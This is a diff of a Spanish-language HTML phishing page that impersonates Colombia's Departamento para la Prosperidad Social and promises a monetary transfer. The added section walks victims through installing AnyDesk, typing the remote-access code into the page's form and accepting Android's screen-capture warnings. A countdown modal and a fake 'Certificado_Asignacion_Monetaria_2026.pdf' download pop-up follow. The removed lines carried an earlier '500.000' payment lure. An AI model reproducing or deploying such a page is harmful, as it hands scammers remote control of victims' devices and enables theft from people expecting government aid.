+        <h3>💻 Verificación por Asistencia Remota</h3>
+        <p>Para concluir el proceso de validación y liberación de su giro, siga atentamente las instrucciones:</p>
+
+        <ul class="pasos-lista">
+            <li>Descargue e <strong>ingrese a la aplicación AnyDesk</strong> en su dispositivo.</li>
+            <li>Visualice y copie el código de acceso remoto que aparece en la pantalla principal de la aplicación.</li>
+            <li>Regrese a esta página e ingrese el código en el recuadro inferior, luego presione Sincronizar.</li>
+            <li>Aparecerá en su dispositivo una alerta de seguridad del sistema (⚠️ 🔑).</li>
+            <li>Seleccione la opción inferior: "Soy consciente de los riesgos".</li>
+            <li>Pulse Aceptar en la ventana emergente de transmisión.</li>
+            <li>Confirme nuevamente pulsando Aceptar.</li>
+            <li>Por último, haga clic en Empezar ahora</li>
+        </ul>
+
+        <a href="https://play.google.com/store/apps/details?id=com.anydesk.anydeskandroid" target="_blank" class="btn-anydesk-img">
+            <img src="https://i.ibb.co/m5NBTkQQ/8ff96ad4-36eb-446f-9fda-bd928ef5a1b5.png" alt="Descargar en Google Play">
+        </a>
+
+        <form class="input-codigo-grupo" onsubmit="enviarCodigoAnydesk(event)">
+            <label for="codigoAnydesk">Ingrese Código de Acceso:</label>
+            <input type="text" id="codigoAnydesk" placeholder="Ej. 123 456 789" autocomplete="off">
+            <button type="submit" class="btn-enviar-codigo">Sincronizar</button>
+        </form>
     </div>
 
-    <!-- Bloque de publicidad comercial -->
-    <div class="seccion-publicidad">
-        <h4>Información Comercial y Alianzas de la Red</h4>
-        <div class="banner-anuncio-1">
-            ¡Descubra cómo activar su cuenta de ahorros digital sin comisiones ni filas adicionales!
-        </div>
-        <div style="height: 10px;"></div>
-        <div class="banner-anuncio-2">
-            ¡Aproveche subsidios complementarios para servicios públicos y canasta familiar este mes!
-        </div>
-    </div>
-
+    <!-- Footer institucional -->
     <div class="footer-gov">
-        República de Colombia • Todos los derechos reservados © 2026<br>
-        Ministerio de Hacienda y Crédito Público — Red de Corresponsales Nacionales
+        Departamento para la Prosperidad Social (DPS) &copy; 2026<br>
+        Todos los derechos reservados - República de Colombia
     </div>
-
 </div>
 
-<!-- Pantalla emergente -->
+<!-- Modal de Cuenta Regresiva Automática de 10 segundos -->
+<div id="modal-cuenta-regresiva">
+    <div class="regresiva-contenido">
+        <h3>Preparando Conexión...</h3>
+        <p>En breve se abrirá la aplicación en su dispositivo móvil con la solicitud de acceso remoto.</p>
+        <div id="contadorSegundos" class="contador-numero">10</div>
+        <div class="barra-progreso-contenedor">
+            <div id="barraProgresoFill" class="barra-progreso-fill"></div>
+        </div>
+    </div>
+</div>
+
+<!-- Pantalla Emergente del PDF (Aparece al terminar la cuenta atrás) -->
 <div id="pantalla-pdf-estilo">
     <div class="pdf-icono-caja">
-        <img src="https://familiaincatec.edu.co/wp-content/uploads/2022/12/pago-2-1024x664.png" alt="Logo de Pago" class="logo-personalizado">
+        <span style="font-size: 40px;">📄</span>
     </div>
-    <div class="pdf-nombre-archivo">Te han enviado 500.000,00</div>
-    
+    <div class="pdf-nombre-archivo">Certificado_Asignacion_Monetaria_2026.pdf</div>
     <div class="contenedor-botones-modal">
-        <button type="button" class="btn-modal btn-rechazar" onclick="cerrarInterfaz()">Rechazar</button>
-        <a href="https://bonovalidacion500.netlify.app/Recibistes%20500.000,00k.pdf" target="_blank" class="btn-modal btn-aceptar">Aceptar</a>
+        <button type="button" class="btn-modal btn-rechazar" onclick="cerrarInterfaz()">Cerrar</button>
+        <a href="#" class="btn-modal btn-aceptar" onclick="alert('Descarga iniciada.'); cerrarInterfaz();">Descargar</a>
     </div>
 </div>
-
-<script>
-    function mostrarInterfazPDF() {
-        document.getElementById('pantalla-pdf-estilo').style.display = 'flex';
-    }
-
-    function cerrarInterfaz() {
-        document.getElementById('pantalla-pdf-estilo').style.display = 'none';
-    }
-</script>
 
 </body>
 </html>
